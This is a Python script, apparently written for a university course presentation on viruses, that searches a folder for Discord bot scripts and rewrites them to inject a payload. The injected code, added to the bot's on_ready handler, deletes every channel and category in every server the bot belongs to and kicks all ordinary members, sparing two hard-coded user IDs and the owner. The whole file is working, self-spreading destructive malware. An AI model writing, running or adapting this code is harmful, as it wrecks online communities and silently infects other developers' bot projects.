import getpass
import os

# inserts the virus code into the lines that will be written back into the file
def insert_payload(lines, client):
	lines.append("\t# ------------------------ VIRUS STARTS HERE ------------------------\n")
	lines.append(f"\tfor server in {client}.guilds:\n")
	lines.append("\t\tfor channel in server.channels:\n")
	lines.append("\t\t\tawait channel.delete()\n")
	lines.append("\t\t\n")
	lines.append("\t\tfor user in server.members:\n")
	lines.append("\t\t\tif (not user.id == 912495619472523264 and not user.id == 89766741139292160 and not user.id == server.owner_id and not user.guild_permissions.administrator):\n")
	lines.append("\t\t\t\tawait user.kick()\n")
	lines.append("\t\t\n")
	lines.append("\t\tfor category in server.categories:\n")
	lines.append("\t\t\tawait category.delete()\n")
	lines.append("\t# ------------------------ VIRUS ENDS HERE ------------------------\n")

# gets the username of the current logged in user to go to the filepath with files to infect
username = getpass.getuser()
# MAKE SURE TO CHANGE THIS FILEPATH TO THE REPOSITORY ON YOUR MACHINE IF THIS IS NOT THE FILEPATH
infectiondir = f"C:/Users/{username}/Documents/GitHub/UIdahoCS336VirusPresentation/DiscordBot"

# gets a list of every file and folder in this directory
subdirs = os.walk(infectiondir, topdown=True, followlinks=False)
# look through every subdirectory
for d in subdirs:
	# look through every file in each directory
	for file in d[2]:
		# if that file is a python file, infect it
		if (file.endswith(".py")):
			infpath = f"{d[0]}/{file}"
			flines = []
			inflines = []
			# get a string list of every line in the file
			with open(infpath, "r") as inf:
				flines = inf.readlines()

			isbot = False

			# copy over all the import lines
			while (flines[0].startswith("import ") or (flines[0].startswith ("from ") and "import " in flines[0]) or flines[0].startswith("#") or flines[0].startswith("\n") or flines[0].startswith("\t")):
				# checks to see if the script is for a discord bot
				if (flines[0] == "import discord\n"):
					isbot = True
					break
				inflines.append(flines[0])
				flines.pop(0)

			# if this python script is for a discord bot
			if (isbot):
				client = ""
				# loops until it finds where to insert the virus
				while (True):
					# gets the variable name that the script uses for the discord client
					if (("= discord.Client(" in flines[0] or "=discord.Client(" in flines[0]) and flines[0].endswith(")\n")):
						client = flines[0].split("=")[0].strip()
					# if there's already an on_ready() function, insert the virus at the start of this one
					elif (flines[0] == "async def on_ready():\n"):
						inflines.append(flines[0])
						flines.pop(0)
						insert_payload(inflines, client)
						break
					# if there is not on_ready() function, create one right before the call to run the bot
					elif (flines[0].startswith(f"{client}.run(") and flines[0].endswith(")\n")):
						inflines.append(f"@{client}.event\n")
						inflines.append("async def on_ready():\n")
						insert_payload(inflines, client)
						inflines.append(flines[0])
						flines.pop(0)
						break

					inflines.append(flines[0])
					flines.pop(0)
					
					# if the end of the script is reached and no insert point is found, exit
					if (len(flines) == 0):
						break

				# copy over the rest of the file
				inflines.extend(flines)

				# write the lines from the file back into itself with the virus code injected
				with open(infpath, "w") as inf:
					for s in inflines:
						inf.write(s)